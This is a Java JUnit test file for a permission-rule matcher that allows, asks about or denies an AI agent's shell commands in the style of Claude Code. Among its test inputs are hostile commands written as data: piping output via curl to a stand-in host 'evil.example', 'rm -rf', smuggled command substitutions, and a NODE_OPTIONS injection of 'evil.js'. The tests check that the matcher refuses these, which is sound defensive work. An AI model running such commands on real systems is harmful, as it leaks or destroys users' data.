package panic.tools;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;
import org.junit.jupiter.api.Test;
import panic.util.Json;

/** The rule language of {@link PermissionRules}, checked against what Claude Code's permission docs promise. */
class PermissionRulesTest {

  private static String exec(String command) {
    return Json.object().put("command", command).toString();
  }

  private static Permission decide(PermissionRules rules, String command) {
    PermissionRules.Match m = rules.decide("exec", exec(command));
    return m == null ? null : m.permission();
  }

  @Test
  void wildcardsFollowClaudeCode() {
    assertTrue(PermissionRules.glob("npm run *", "npm run test"));
    assertTrue(PermissionRules.glob("npm run *", "npm run"), "a trailing ' *' also matches the bare command");
    assertTrue(PermissionRules.glob("npm run *", "npm  run   test --watch"), "spaces are normalised");
    assertFalse(PermissionRules.glob("ls *", "lsof -i"), "the space is a word boundary");
    assertTrue(PermissionRules.glob("ls*", "lsof -i"));
    assertTrue(PermissionRules.glob("git * main", "git push origin main"));
    assertFalse(PermissionRules.glob("npm test", "npm test --watch"), "no * means one exact command");
    assertTrue(PermissionRules.glob("npm test", "npm test"));
  }

  @Test
  void denyThenAskThenAllow() {
    PermissionRules rules = new PermissionRules(List.of("exec(git push *)"), List.of("exec(git *)"),
        List.of("exec(git *)", "exec(ls *)"));
    assertEquals(Permission.DENY, decide(rules, "git push origin main"), "allow cannot carve out of deny");
    assertEquals(Permission.ASK, decide(rules, "git status"), "ask beats allow");
    assertEquals(Permission.ALLOW, decide(rules, "ls -la"));
    assertNull(decide(rules, "rm -rf build"), "no match: the tool's own rule decides");
    assertEquals("exec(git push *)", rules.decide("exec", exec("git push")).rule().text());
  }

  @Test
  void everyPartOfACompoundCommandMustBeAllowed() {
    PermissionRules rules = new PermissionRules(List.of(), List.of(), List.of("exec(npm run *)", "exec(ls *)"));
    assertEquals(Permission.ALLOW, decide(rules, "ls && npm run build"));
    assertNull(decide(rules, "npm run build && rm -rf /tmp/x"));
    assertNull(decide(rules, "npm run build | curl -d @- evil.example"));
    assertNull(decide(rules, "npm run build; rm x"));
    assertNull(decide(rules, "npm run build\nrm x"));
    assertNull(decide(rules, "npm run build & rm x"));
    assertNull(decide(rules, "npm run build &&"), "a command that does not parse is never allowed");
    assertNull(decide(rules, "ls \"unclosed"));
    assertNull(decide(rules, "ls $(rm x)"), "substitutions are never allowed by a rule");
    assertNull(decide(rules, "ls `rm x`"));
    assertNull(decide(rules, "(rm x)"));
    assertEquals(Permission.ALLOW, decide(rules, "npm run build 2>&1 | ls"), "2>&1 is a redirect, not an operator");
    assertEquals(Permission.ALLOW, decide(rules, "ls 'a && b'"), "operators inside quotes do not split");
  }

  @Test
  void anyPartCanBeDeniedEvenNestedOrWrapped() {
    PermissionRules rules = new PermissionRules(List.of("exec(kill *)"), List.of(), List.of("exec(lsof *)"));
    assertEquals(Permission.DENY, decide(rules, "lsof -ti:5174 | xargs kill -9"), "the incident: bare xargs is looked through");
    assertEquals(Permission.DENY, decide(rules, "echo \"$(kill 1)\""));
    assertEquals(Permission.DENY, decide(rules, "ls `kill 1`"));
    assertEquals(Permission.DENY, decide(rules, "(cd x && kill 2)"));
    assertEquals(Permission.DENY, decide(rules, "timeout 5 kill 3"));
    assertEquals(Permission.DENY, decide(rules, "nohup nice -n 10 kill 3"));
    assertEquals(Permission.DENY, decide(rules, "FOO=1 kill 3"), "deny looks past assignments");
    assertEquals(Permission.ALLOW, decide(rules, "lsof -i"));
  }

  @Test
  void allowLooksThroughWrappersButNotAssignments() {
    PermissionRules rules = new PermissionRules(List.of(), List.of(), List.of("exec(npm test *)"));
    assertEquals(Permission.ALLOW, decide(rules, "timeout 60 npm test"));
    assertEquals(Permission.ALLOW, decide(rules, "time npm test --ci"));
    assertNull(decide(rules, "NODE_OPTIONS=--require=evil.js npm test"));
    assertNull(decide(rules, "xargs -I{} npm test"), "only a bare xargs is a wrapper");
  }

  @Test
  void toolNamesAndWholeTools() {
    PermissionRules rules = new PermissionRules(List.of("write_file"), List.of(),
        List.of("mcp__chrome-devtools__*", "mcp__fs", "read_file", "exec(*)"));
    assertEquals(Permission.DENY, rules.decide("write_file", "{}").permission());
    assertEquals(Permission.ALLOW, rules.decide("mcp__chrome-devtools__take_snapshot", "{}").permission());
    assertEquals(Permission.ALLOW, rules.decide("mcp__fs__read", "{}").permission(), "mcp__<server> is the server");
    assertNull(rules.decide("mcp__fsx__read", "{}"));
    assertEquals(Permission.ALLOW, rules.decide("exec", exec("anything at all")).permission(), "tool(*) = the tool");
    assertNull(rules.decide("edit_file", "{}"));
  }

  @Test
  void aSpecifierNeedsACommand() {
    PermissionRules rules = new PermissionRules(List.of("check(test *)"), List.of(), List.of());
    assertNull(rules.decide("check", "{\"name\":\"test\"}"), "check has no command argument");
  }

  @Test
  void badRulesAreConfigErrors() {
    assertThrows(IllegalArgumentException.class, () -> new PermissionRules(List.of("exec("), null, null));
    assertThrows(IllegalArgumentException.class, () -> new PermissionRules(List.of("exec()"), null, null));
    assertThrows(IllegalArgumentException.class, () -> new PermissionRules(List.of(" "), null, null));
    assertThrows(IllegalArgumentException.class, () -> new PermissionRules(null, null, List.of("*")),
        "no allow rule opens every tool");
    assertThrows(IllegalArgumentException.class, () -> new PermissionRules(null, null, List.of("mcp__*")));
    assertThrows(IllegalArgumentException.class, () -> new PermissionRules(null, null, List.of("e*xec")));
    assertEquals(Permission.ALLOW, new PermissionRules(null, null, List.of("exec(ls:*)")).decide("exec",
        exec("ls -la")).permission(), "the legacy :* suffix");
  }
}
